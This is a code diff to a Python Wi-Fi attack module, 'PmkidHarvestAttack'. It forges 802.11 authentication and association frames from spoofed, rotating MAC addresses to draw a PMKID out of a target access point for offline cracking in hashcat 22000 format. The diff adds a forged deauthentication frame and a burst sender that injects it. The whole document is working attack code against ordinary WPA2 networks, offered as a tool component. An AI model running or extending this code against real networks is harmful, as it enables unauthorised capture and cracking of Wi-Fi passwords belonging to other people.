@@ -8,9 +8,14 @@ Sequence per attempt:
        the Key Data. The existing frame parser surfaces it as
        ``parsed['eapol_pmkid']`` and the WlanInterface populates
        ``AP.handshakes[source].pmkid`` for free.
+    5. Deauth the AP and stop the moment M1 arrives. M1 is terminal: we can't
+       send M2 (no PSK for its MIC), so a PMKID-less M1 means this AP exposes
+       none — give up rather than retry the same empty M1 — and even on success
+       the deauth frees the AP from retransmitting M1 for ~5 s. We only rotate
+       the MAC and retry when the AP stays *silent* (a lost Auth/Assoc).
 
-The attack itself returns the harvested 16-byte PMKID (or ``None`` if the
-AP doesn't include one / times out). Cracker-side, the existing
+The attack returns the harvested 16-byte PMKID, or ``None`` if the AP answers
+with a PMKID-less M1 (or never answers). Cracker-side, the existing
 ``engine/hc22000.write_hc22000`` writes a ``WPA*01*…`` hashline whenever
 ``hs.pmkid`` is set.
 """
@@ -136,28 +141,55 @@ class PmkidHarvestAttack:
         body = cap_info + listen_int + ssid_ie + rates_ie + ext_rates_ie + rsn_ie
         return mac_hdr + body
 
+    def _build_deauth(self) -> bytes:
+        """802.11 Deauthentication (reason 3 = STA leaving) from our forged MAC to
+        the AP. Addr1=BSSID (dest), Addr2=us, Addr3=BSSID."""
+        # FC: type=mgmt(0), subtype=deauth(0x0C) → 0xC0
+        mac_hdr = (
+            b"\xc0\x00"
+            + b"\x00\x00"
+            + self.bssid_bytes
+            + self.source_mac
+            + self.bssid_bytes
+            + b"\x00\x00"
+        )
+        return mac_hdr + struct.pack("<H", 3)   # reason 3 = STA leaving
+
     # ---- Driver -------------------------------------------------------------
 
-    def _harvested_pmkid(self) -> Optional[bytes]:
-        """Check if the parser-side has already populated a PMKID for our
-        current forged client MAC on this AP."""
+    def _received_m1(self):
+        """The parser-created Handshake for our forged MAC on this AP once its M1
+        (EAPOL-Key msg 1) lands — present the moment M1 arrives, with or without a
+        PMKID; None until then. M1 is terminal for us: we can't compute M2's MIC
+        without the PSK, so a PMKID-less M1 means this AP simply doesn't expose one
+        (retrying the same AP would only re-fetch the same empty M1)."""
         ap_state = self.iface.access_points.get(self.target.bssid.lower())
         if not ap_state:
             return None
-        mac_str = _mac_bytes_to_str(self.source_mac)
-        hs = ap_state.handshakes.get(mac_str)
-        if hs and hs.pmkid:
-            if hs.akm_client is None:
-                hs.akm_client = _AKM_PSK   # we negotiated PSK in our forged Assoc
-            return hs.pmkid
-        return None
+        return ap_state.handshakes.get(_mac_bytes_to_str(self.source_mac))
+
+    async def _send_leaving_deauth(self, count: int = 3) -> None:
+        """Deauth the AP (×count) the instant we have M1 — we never send M2, so
+        otherwise the AP retransmits M1 for ~5 s waiting for it. PMKID harvest runs
+        without active-monitor (a one-shot, so our TX is un-ACKed); a single deauth
+        could drop unnoticed, so send a small burst so 'we're leaving' lands."""
+        frame = self._build_deauth()
+        for _ in range(count):
+            await self.iface.send_raw(frame, use_no_ack=True)
+            await asyncio.sleep(0.003)
 
     async def run(
         self,
         attempts: int = 3,
         m1_timeout: float = 2.0,
     ) -> Optional[bytes]:
-        """Try ``attempts`` rounds. Returns 16-byte PMKID on success, else None."""
+        """Try up to ``attempts`` association rounds. Returns the 16-byte PMKID on
+        success, else None.
+
+        Receiving M1 is terminal: we deauth (we can never answer with M2) and stop
+        — with the PMKID on success, or empty-handed if this AP ships a PMKID-less
+        M1 (no point retrying the same AP). We only rotate the MAC and retry when
+        the AP stays *silent* (a lost Auth/Assoc in the pre-M1 dance)."""
 
         # Make sure we're on the AP's channel — Focus already tunes here,
         # but be defensive.
@@ -170,27 +202,34 @@ class PmkidHarvestAttack:
                 f"{self.target.bssid} as {_mac_bytes_to_str(self.source_mac)}"
             )
             await self.iface.send_raw(self._build_auth_req(), use_no_ack=True)
-            # No explicit Auth Resp poll — the parser/state path handles
-            # passive reception, and many APs don't require an interleave
-            # delay anyway. Tiny pause so the AP processes the Auth before
-            # the Assoc lands.
+            # Tiny pause so the AP processes the Auth before the Assoc lands.
             await asyncio.sleep(0.1)
             await self.iface.send_raw(self._build_assoc_req(), use_no_ack=True)
 
-            # Poll the parser-populated handshake dict for our forged MAC.
+            # Poll the parser-populated handshake dict for our forged MAC's M1.
             deadline = time.time() + m1_timeout
             while time.time() < deadline:
-                pmkid = self._harvested_pmkid()
-                if pmkid:
+                hs = self._received_m1()
+                if hs is not None:
+                    # M1 in hand — terminal. Free the air before we leave.
+                    await self._send_leaving_deauth()
+                    if hs.pmkid:
+                        if hs.akm_client is None:
+                            hs.akm_client = _AKM_PSK   # we negotiated PSK in our Assoc
+                        logger.info(
+                            f"[PMKID] Harvested {hs.pmkid.hex()} from {self.target.bssid} "
+                            f"(STA {_mac_bytes_to_str(self.source_mac)})"
+                        )
+                        return hs.pmkid
                     logger.info(
-                        f"[PMKID] Harvested {pmkid.hex()} from {self.target.bssid} "
-                        f"(STA {_mac_bytes_to_str(self.source_mac)})"
+                        f"[PMKID] {self.target.bssid} answered with a PMKID-less M1 — "
+                        f"this AP doesn't expose one; not retrying."
                     )
-                    return pmkid
+                    return None
                 await asyncio.sleep(0.05)
 
             logger.info(
-                f"[PMKID] Attempt {attempt} timed out — rotating MAC and retrying."
+                f"[PMKID] Attempt {attempt}: no M1 (AP silent) — rotating MAC and retrying."
             )
             self._rotate_mac()
 
